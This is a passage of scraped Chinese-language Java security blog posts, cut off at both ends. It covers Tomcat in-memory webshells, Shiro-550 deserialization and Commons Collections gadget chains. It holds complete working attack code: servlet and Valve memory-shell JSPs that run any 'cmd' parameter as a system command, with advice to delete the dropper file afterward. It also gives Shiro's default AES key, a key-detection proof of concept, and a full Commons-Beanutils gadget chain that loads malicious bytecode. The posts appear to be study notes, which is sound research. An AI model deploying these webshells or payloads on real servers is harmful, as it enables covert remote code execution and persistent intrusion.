&#125;catch (Exception e)&#123; return; &#125; &#125; Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;); StandardEngine engine = null; try &#123; engine = (StandardEngine) getField(service, &quot;container&quot;); &#125;catch (Exception e)&#123;&#125; if (engine == null)&#123; engine = (StandardEngine) getField(service, &quot;engine&quot;); &#125; children = (HashMap) getField(engine, &quot;children&quot;); StandardHost standardHost = (StandardHost) children.get(this.serverName); children = (HashMap) getField(standardHost, &quot;children&quot;); Iterator iterator = children.keySet().iterator(); while (iterator.hasNext())&#123; String contextKey = (String) iterator.next(); if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125; StandardContext standardContext = (StandardContext) children.get(contextKey); this.standardContext = standardContext; return; &#125; &#125; &#125; &#125; public StandardContext getSTC()&#123; return this.standardContext; &#125;&#125;%&gt;&lt;% //获取StandardContext对象 Tomcat6789 a = new Tomcat6789(); StandardContext standardContext = a.getSTC(); //创建恶意servlet String servletURL = &quot;/cmdServlet&quot;; String servletName = &quot;CmdServlet&quot;; Servlet servlet = new Servlet() &#123; @Override public void init(ServletConfig servletConfig) &#123; &#125; @Override public ServletConfig getServletConfig() &#123; return null; &#125; @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException &#123; String cmd = servletRequest.getParameter(&quot;cmd&quot;); if (&quot;cmd&quot; != null) &#123; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); &#125; &#125; @Override public String getServletInfo() &#123; return null; &#125; @Override public void destroy() &#123; &#125; &#125;; //创建wrapper，设置恶意servlet Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(servletName); wrapper.setServlet(servlet); wrapper.setServletClass(servlet.getClass().getName()); // 令loadOnStartup大于0 wrapper.setLoadOnStartup(1); // 添加到children容器中 standardContext.addChild(wrapper); // 设置servlet映射 standardContext.addServletMappingDecoded(servletURL, servletName);%&gt; 访问注入内存马的jsp文件，然后删除jsp文件，访问/cmdServlet路由，添加cmd参数执行命令 Pipeline-Valve内存马实现Container请求处理流程源码分析中讲到过Pineline的调用链，setNext、getNext、invoke 这三个方法，通过setNext设置该阀的下一阀，通过 getNext 返回该阀的下一个阀的引用，invoke 方法则执行该阀内部自定义的请求处理代码。 创建恶意valve 获取Pineline对象通过addValve增加恶意valve 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Valve&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;% class Tomcat6789 &#123; String uri; String serverName; StandardContext standardContext; public Object getField(Object object, String fieldName) &#123; Field declaredField; Class clazz = object.getClass(); while (clazz != Object.class) &#123; try &#123; declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); &#125; catch (NoSuchFieldException e)&#123;&#125; catch (IllegalAccessException e)&#123;&#125; clazz = clazz.getSuperclass(); &#125; return null; &#125; public Tomcat6789() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); Object object; for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if (thread.getName().contains(&quot;exec&quot;)) &#123; continue; &#125; Object target = this.getField(thread, &quot;target&quot;); if (!(target instanceof Runnable)) &#123; continue; &#125; try &#123; object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;); &#125; catch (Exception e) &#123; continue; &#125; if (object == null) &#123; continue; &#125; java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;); Iterator iterator = processors.iterator(); while (iterator.hasNext()) &#123; Object next = iterator.next(); Object req = getField(next, &quot;req&quot;); Object serverPort = getField(req, &quot;serverPort&quot;); if (serverPort.equals(-1))&#123;continue;&#125; org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;); this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;); if (this.serverName == null)&#123; this.serverName = serverNameMB.toString(); &#125; if (this.serverName == null)&#123; this.serverName = serverNameMB.getString(); &#125; org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;); this.uri = (String) getField(uriMB, &quot;strValue&quot;); if (this.uri == null)&#123; this.uri = uriMB.toString(); &#125; if (this.uri == null)&#123; this.uri = uriMB.getString(); &#125; this.getStandardContext(); return; &#125; &#125; &#125; public void getStandardContext() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123; Object target = this.getField(thread, &quot;target&quot;); HashMap children; Object jioEndPoint = null; try &#123; jioEndPoint = getField(target, &quot;this$0&quot;); &#125;catch (Exception e)&#123;&#125; if (jioEndPoint == null)&#123; try&#123; jioEndPoint = getField(target, &quot;endpoint&quot;); &#125;catch (Exception e)&#123; return; &#125; &#125; Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;); StandardEngine engine = null; try &#123; engine = (StandardEngine) getField(service, &quot;container&quot;); &#125;catch (Exception e)&#123;&#125; if (engine == null)&#123; engine = (StandardEngine) getField(service, &quot;engine&quot;); &#125; children = (HashMap) getField(engine, &quot;children&quot;); StandardHost standardHost = (StandardHost) children.get(this.serverName); children = (HashMap) getField(standardHost, &quot;children&quot;); Iterator iterator = children.keySet().iterator(); while (iterator.hasNext())&#123; String contextKey = (String) iterator.next(); if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125; StandardContext standardContext = (StandardContext) children.get(contextKey); this.standardContext = standardContext; return; &#125; &#125; &#125; &#125; public StandardContext getSTC()&#123; return this.standardContext; &#125; &#125;%&gt;&lt;% //获取StandardContext对象 Tomcat6789 a = new Tomcat6789(); StandardContext standardContext = a.getSTC();%&gt;&lt;% //创建恶意valve class MyValve implements Valve &#123; private Valve next; @Override public Valve getNext() &#123; return next; &#125; @Override public void setNext(Valve valve) &#123; next = valve; &#125; @Override public void backgroundProcess() &#123; &#125; @Override public void invoke(Request request, Response response) throws IOException, ServletException &#123; HttpServletRequest req = request; String cmd = req.getParameter(&quot;cmd&quot;); if (cmd != null) &#123; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; PrintWriter out = response.getWriter(); out.println(output); out.flush(); out.close(); &#125; getNext().invoke(request, response); &#125; @Override public boolean isAsyncSupported() &#123; return true; &#125; &#125; //获取Pineline对象通过addValve增加恶意valve standardContext.getPipeline().addValve(new MyValve());%&gt; 访问注入valve内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令","categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"Shiro反序列化-550","slug":"20220109","date":"2022-01-09T05:38:24.000Z","updated":"2022-01-10T14:51:34.362Z","comments":false,"path":"2022/01/09/20220109/","link":"","permalink":"https://self209.github.io/2022/01/09/20220109/","excerpt":"Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。","text":"Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。 漏洞环境： shiro：https://github.com/apache/shiro 1234git clone https://github.com/apache/shiro.gitcd shiro//切换到1.2.4版本git checkout shiro-root-1.2.4 注意：修改shiro/samples/web目录下的pom.xml，将jstl的版本修改为1.2 123456&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; ieda配置tomcat：https://www.bilibili.com/video/BV1V54y1q7Qj 漏洞分析rememberMe加密生成过程1234567891011121314151617调用过程：DefaultSecurityManager.login()-&gt;DefaultSecurityManager.onSuccessfulLogin()-&gt;DefaultSecurityManager.rememberMeSuccessfulLogin()-&gt; AbstractRememberMeManager.onSuccessfulLogin()-&gt; CookieRememberMeManager.forgetIdentity(Subject subject)-&gt; WebUtils.getHttpRequest()-&gt; WebUtils.getHttpResponse()-&gt; CookieRememberMeManager.forgetIdentity(HttpServletRequest request, HttpServletResponse response)-&gt; CookieRememberMeManager.getCookie()-&gt; SimpleCookie.removeFrom()-&gt; AbstractRememberMeManager.rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)-&gt; AbstractRememberMeManager.rememberIdentity(Subject subject, PrincipalCollection accountPrincipals)-&gt; AbstractRememberMeManager.convertPrincipalsToBytes()-&gt; AbstractRememberMeManager.serialize()-&gt;//对用户对象进行序列化 AbstractRememberMeManager.encrypt()-&gt;//对序列化用户对象的字节数组进行加密 CookieRememberMeManager.rememberSerializedIdentity()//对加密的字节数组进行base64编码，保存在cookie中。 org/apache/shiro/mgt/DefaultSecurityManager.java的login下断点，login方法调用了onSuccessfulLogin方法，onSuccessfulLogin方法调用rememberMeSuccessfulLogin方法，rememberMeSuccessfulLogin方法调用AbstractRememberMeManager.onSuccessfulLogin方法。 AbstractRememberMeManager.onSuccessfulLogin方法调用CookieRememberMeManager.forgetIdentity方法，forgetIdentity方法会先获取请求和响应包，调用getCookie获取请求的cookie，调用SimpleCookie.removeFrom方法在response头部添加Set-Cookie: rememberMe=deleteMe 然后再回到onSuccessfulLogin方法中，如果设置rememberMe则进入rememberIdentity。 rememberIdentity调用convertPrincipalsToBytes方法 进入convertPrincipalsToBytes方法，先对用户对象进行序列化，然后对序列化的数据进行加密，跟进encrypt方法。加密算法为AES，模式为CBC，填充算法为PKCS5Padding。 调用getEncryptionCipherKey获取加密密钥，在Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA== 加密完成返回，接着调用CookieRememberMeManager.rememberSerializedIdentity方法 跟进CookieRememberMeManager.rememberSerializedIdentity方法，对加密的字节数组进行base64编码，保存在cookie中。 rememberMe解密反序列化过程123456789调用过程：DefaultSecurityManager.resolvePrincipals()-&gt;DefaultSecurityManager.getRememberedIdentity()-&gt; AbstractRememberMeManager.getRememberedPrincipals()-&gt; CookieRememberMeManager.getRememberedSerializedIdentity()-&gt; AbstractRememberMeManager.convertBytesToPrincipals()-&gt; AbstractRememberMeManager.decrypt()-&gt; AbstractRememberMeManager.deserialize()-&gt; DefaultSerializer.deserialize() 在DefaultSecurityManager.resolvePrincipals方法下断点， resolvePrincipals方法调用getRememberedIdentity方法，跟进getRememberedIdentity方法。 getRememberedIdentity方法调用AbstractRememberMeManager.getRememberedPrincipals方法，跟进getRememberedPrincipals方法。 getRememberedPrincipals方法调用CookieRememberMeManager.getRememberedSerializedIdentity方法，跟进getRememberedSerializedIdentity方法。获取序列化的凭证，从请求中获取 Cookie 中的 rememberMe 并进⾏ base64 解码，解码后内容为AES加密内容字节数组并返回给bytes字节数组。 回到getRememberedPrincipals方法，调用convertBytesToPrincipals 方法，将解码的内容传⼊ convertBytesToPrincipals 进⾏ AES 解密和反序列化，调⽤ decrypt 方法进⾏AES解密 跟进decrypt方法，getDecryptionCipherKey方法获取密钥(Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==)，进行解密，最后返回解密完成后序列化对象的字节数组。 回到convertBytesToPrincipals方法，调用deserialize方法，跟进deserialize方法。 先调用getSerializer方法获取DefaultSerializer对象，调用DefaultSerializer对象的deserialize方法，跟进DefaultSerializer.deserialize方法。通过字节输入流将其反序列化，至此rememberMe解密反序列化过程结束。 shiro检测shiro-550检测就两点，一是key，二是Gadget chain。虽然≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==，官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key，所以在检测漏洞时我们需要先确定密钥。 参考：一种另类的shiro检测方式 通过是否返回rememberMe=deleteMe判断key的正确性 我们回到解密过程的AbstractRememberMeManager.getRememberedPrincipals方法的convertBytesToPrincipals方法 12345678910111213141516171819202122public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123; PrincipalCollection principals = null; try &#123; byte[] bytes = this.getRememberedSerializedIdentity(subjectContext); if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123; principals = this.convertBytesToPrincipals(bytes, subjectContext); &#125; &#125; catch (RuntimeException var4) &#123; principals = this.onRememberedPrincipalFailure(var4, subjectContext); &#125; return principals;&#125;protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123; if (this.getCipherService() != null) &#123; bytes = this.decrypt(bytes); &#125; return this.deserialize(bytes);&#125; 调用decrypt方法进行解密，当key错误的时候解密失败，就会抛出异常，getRememberedPrincipals方法就会捕获异常，调用onRememberedPrincipalFailure方法， 12345678protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) &#123; if (log.isDebugEnabled()) &#123; log.debug(&quot;There was a failure while trying to retrieve remembered principals. This could be due to a configuration problem or corrupted principals. This could also be due to a recently changed encryption key. The remembered identity will be forgotten and not used for this request.&quot;, e); &#125; this.forgetIdentity(context); throw e;&#125; onRememberedPrincipalFailure方法调用forgetIdentity方法，forgetIdentity方法在前面加密过程中有提到，调用SimpleCookie.removeFrom方法在response头部添加Set-Cookie: rememberMe=deleteMe，当我们key错误的时候会返回rememberMe=deleteMe，这是一种情况。 还有一种情况，用反序列化 gadget 生成之后，拿shiro加密算法进行加密，但是最后依然在 response里面携带了rememberMe=deleteMe。 还是回到 AbstractRememberMeManager.convertBytesToPrincipals方法当中，这里的key肯定是正确的，所以经过 decrypt处理之后返回 bytes数组，调用deserialize方法，跟进deserialize方法。 123protected PrincipalCollection deserialize(byte[] serializedIdentity) &#123; return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity);&#125; 反序列化的 gadget 实际上并不是继承了 PrincipalCollection ，所以这里进行类型转换会报错。在做类型转换之前，先进入了 DefaultSerializer#deserialize 进行反序列化处理，等处理结束返回 deserialized 时候，进行类型转换自然又回到了上面提到的类型转换异常，我们 key 不正确的情况下的 catch 异常捕获的逻辑里，后面的流程就和上述一样了。 结合以上两种情况，只需要满足两点： 1.构造一个继承 PrincipalCollection 的序列化对象。 2.key正确情况下不返回 deleteMe ，key错误情况下返回 deleteMe 。 基于这两个条件下 SimplePrincipalCollection 这个类自然就出现了，这个类可被序列化，继承了 PrincipalCollection 。 构造POC实际上也很简单，构造一个这个空对象也是可以达到效果的。 1234SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(&quot;payload&quot;));obj.writeObject(simplePrincipalCollection);obj.close(); Commons Beanutils反序列化Gadget chain: 1234567891011ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() BeanComparator.compare() TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() 首先我们需要了解Commons Beanutils是干什么的，Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。 例： 12345678910public class Cat &#123; private String name = &quot;miao~ miao~&quot;; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。 commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以动态调用任意JavaBean的getter方法 例： 12345public static void main(String[] args)&#123; Cat cat = new Cat(); System.out.println(PropertyUtils.getProperty(cat,&quot;name&quot;));&#125; 调试看看getProperty做了一些什么。 进入PropertyUtils.getProperty，调用PropertyUtilsBean.getProperty方法，跟进继续调用PropertyUtilsBean.getNestedProperty方法，继续跟进。 12345678910111213141516171819202122232425262728293031323334353637383940public Object getNestedProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123; if (bean == null) &#123; throw new IllegalArgumentException(&quot;No bean specified&quot;); &#125; else if (name == null) &#123; throw new IllegalArgumentException(&quot;No name specified for bean class &#x27;&quot; + bean.getClass() + &quot;&#x27;&quot;); &#125; else &#123; while(this.resolver.hasNested(name)) &#123; String next = this.resolver.next(name); Object nestedBean = null; if (bean instanceof Map) &#123; nestedBean = this.getPropertyOfMapBean((Map)bean, next); &#125; else if (this.resolver.isMapped(next)) &#123; nestedBean = this.getMappedProperty(bean, next); &#125; else if (this.resolver.isIndexed(next)) &#123; nestedBean = this.getIndexedProperty(bean, next); &#125; else &#123; nestedBean = this.getSimpleProperty(bean, next); &#125; if (nestedBean == null) &#123; throw new NestedNullException(&quot;Null property value for &#x27;&quot; + name + &quot;&#x27; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27;&quot;); &#125; bean = nestedBean; name = this.resolver.remove(name); &#125; if (bean instanceof Map) &#123; bean = this.getPropertyOfMapBean((Map)bean, name); &#125; else if (this.resolver.isMapped(name)) &#123; bean = this.getMappedProperty(bean, name); &#125; else if (this.resolver.isIndexed(name)) &#123; bean = this.getIndexedProperty(bean, name); &#125; else &#123; bean = this.getSimpleProperty(bean, name); &#125; return bean; &#125; &#125; 经过一系列判断，最后调用getSimpleProperty方法，继续跟进。 又是一系列判断，最后调用getPropertyDescriptor方法，这个方法检索指定 bean 的指定属性的属性描述符，其中就会返回getter方法和setter方法。 然后通过反射获取getter方法。 123Method getReadMethod(Class clazz, PropertyDescriptor descriptor) &#123; return MethodUtils.getAccessibleMethod(clazz, descriptor.getReadMethod());&#125; 再invoke调用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283private Object invokeMethod(Method method, Object bean, Object[] values) throws IllegalAccessException, InvocationTargetException &#123; if (bean == null) &#123; throw new IllegalArgumentException(&quot;No bean specified - this should have been checked before reaching this method&quot;); &#125; else &#123; String valueString; int i; Class[] parTypes; int i; String expectedString; IllegalArgumentException e; try &#123; return method.invoke(bean, values); &#125; catch (NullPointerException var9) &#123; valueString = &quot;&quot;; if (values != null) &#123; for(i = 0; i &lt; values.length; ++i) &#123; if (i &gt; 0) &#123; valueString = valueString + &quot;, &quot;; &#125; if (values[i] == null) &#123; valueString = valueString + &quot;&lt;null&gt;&quot;; &#125; else &#123; valueString = valueString + values[i].getClass().getName(); &#125; &#125; &#125; expectedString = &quot;&quot;; parTypes = method.getParameterTypes(); if (parTypes != null) &#123; for(i = 0; i &lt; parTypes.length; ++i) &#123; if (i &gt; 0) &#123; expectedString = expectedString + &quot;, &quot;; &#125; expectedString = expectedString + parTypes[i].getName(); &#125; &#125; e = new IllegalArgumentException(&quot;Cannot invoke &quot; + method.getDeclaringClass().getName() + &quot;.&quot; + method.getName() + &quot; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27; - &quot; + var9.getMessage() + &quot; - had objects of type \\&quot;&quot; + valueString + &quot;\\&quot; but expected signature \\&quot;&quot; + expectedString + &quot;\\&quot;&quot;); if (!BeanUtils.initCause(e, var9)) &#123; this.log.error(&quot;Method invocation failed&quot;, var9); &#125; throw e; &#125; catch (IllegalArgumentException var10) &#123; valueString = &quot;&quot;; if (values != null) &#123; for(i = 0; i &lt; values.length; ++i) &#123; if (i &gt; 0) &#123; valueString = valueString + &quot;, &quot;; &#125; if (values[i] == null) &#123; valueString = valueString + &quot;&lt;null&gt;&quot;; &#125; else &#123; valueString = valueString + values[i].getClass().getName(); &#125; &#125; &#125; expectedString = &quot;&quot;; parTypes = method.getParameterTypes(); if (parTypes != null) &#123; for(i = 0; i &lt; parTypes.length; ++i) &#123; if (i &gt; 0) &#123; expectedString = expectedString + &quot;, &quot;; &#125; expectedString = expectedString + parTypes[i].getName(); &#125; &#125; e = new IllegalArgumentException(&quot;Cannot invoke &quot; + method.getDeclaringClass().getName() + &quot;.&quot; + method.getName() + &quot; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27; - &quot; + var10.getMessage() + &quot; - had objects of type \\&quot;&quot; + valueString + &quot;\\&quot; but expected signature \\&quot;&quot; + expectedString + &quot;\\&quot;&quot;); if (!BeanUtils.initCause(e, var10)) &#123; this.log.error(&quot;Method invocation failed&quot;, var10); &#125; throw e; &#125; &#125;&#125; 那么我们找到一个与getter方法类似的方法，通过getProperty方法调用呢？在cc2中我们用到了类加载代码执行TemplatesImpl类，知道调用newTransformer方法就会加载我准备的恶意代码，在找什么地方调用newTransformer方法的时候在TemplatesImpl类下有一个getOutputProperties方法也调用了newTransformer方法，并且方法名与getter方法类似，我们尝试通过getProperty方法调用。 事实证明是可以的，那我们就需要找调用链，找什么地方使用了getProperty方法。 BeanComparator.compare()在BeanComparator.compare方法中调用了getProperty方法，并且o1可控，property可通过反射赋值。 12345678910111213141516171819private String property;public int compare(Object o1, Object o2) &#123; if (this.property == null) &#123; return this.comparator.compare(o1, o2); &#125; else &#123; try &#123; Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.comparator.compare(value1, value2); &#125; catch (IllegalAccessException var5) &#123; throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString()); &#125; catch (InvocationTargetException var6) &#123; throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString()); &#125; catch (NoSuchMethodException var7) &#123; throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString()); &#125; &#125; &#125; 我们new一个BeanComparator对象，通过反射修改property的值为outputProperties，当调用compare方法是传递templates对象就会调用getProperty方法，就会触发恶意代码，理想总是美好的，现实是残酷的。报错了。 这里我们需要传递一个Comparator，如果不传的话他就会调用ComparableComparator.getInstance，他是commons collections的类，这里就会需要cc的依赖，我们需要找到一个类来替换，这个类需要实现 Comparator 和Serializable 接口，通过IDEA的功能，我们找到一个 ReverseComparator。 通过Collections.reverseOrder()获取ReverseComparator对象，传递到BeanComparator构造方法中。 到了这一步就要cc2相似了，就是PriorityQueue类，这里就不赘述了，直接看完整poc。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Collections;import java.util.PriorityQueue;public class CommonsBeanutilsSerialize &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CB.txt&quot;)); oos.writeObject(object); &#125; public static void unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); byte[][] _bytecodes = &#123;code&#125;; Class c = templates.getClass(); Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;ok&quot;); Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, _bytecodes); Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder()); PriorityQueue priorityQueue = new PriorityQueue(2,comparator); priorityQueue.offer(1); priorityQueue.offer(1); Class aClass = comparator.getClass(); Field property = aClass.getDeclaredField(&quot;property&quot;); property.setAccessible(true); property.set(comparator,&quot;outputProperties&quot;); //为防止在offer的时候触发compare方法，我们就在添加完以后使用反射修改queue对象数组的值。 Class priorityQueueClass = priorityQueue.getClass(); Field queueField = priorityQueueClass.getDeclaredField(&quot;queue&quot;); queueField.setAccessible(true); queueField.set(priorityQueue,new Object[]&#123;templates,templates&#125;); &#125;&#125; 序列化： 反序列化：","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化Commons Collections(四)","slug":"20220102-1","date":"2022-01-02T12:39:42.000Z","updated":"2022-01-07T08:17:28.095Z","comments":false,"path":"2022/01/02/20220102-1/","link":"","permalink":"https://self209.github.io/2022/01/02/20220102-1/","excerpt":"本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。","text":"本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。 CommonsCollections5漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：3.2.1 gradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’ ysoserial Gadget chain： 123456789Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() TiedMapEntry.getValue()1234567891011121314151617public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123; private final Object key; private final Map map; public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key; &#125; public Object getValue() &#123; return map.get(key); &#125; &#125; 在TiedMapEntry类的getValue方法中调用了get方法，map、key可通过构造方法传递。 TiedMapEntry.toString()123public String toString() &#123; return getKey() + &quot;=&quot; + getValue();&#125; TiedMapEntry类的toString方法调用了getValue方法。 12345678910111213141516171819public static void main(String[] args)&#123; Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r); tiedMapEntry.toString();&#125; BadAttributeValueExpException.readObject()1234567891011121314151617181920212223242526272829303132333435public class BadAttributeValueExpException extends Exception &#123; private Object val; public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; public String toString() &#123; return &quot;BadAttributeValueException: &quot; + val; &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(&quot;val&quot;, null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof 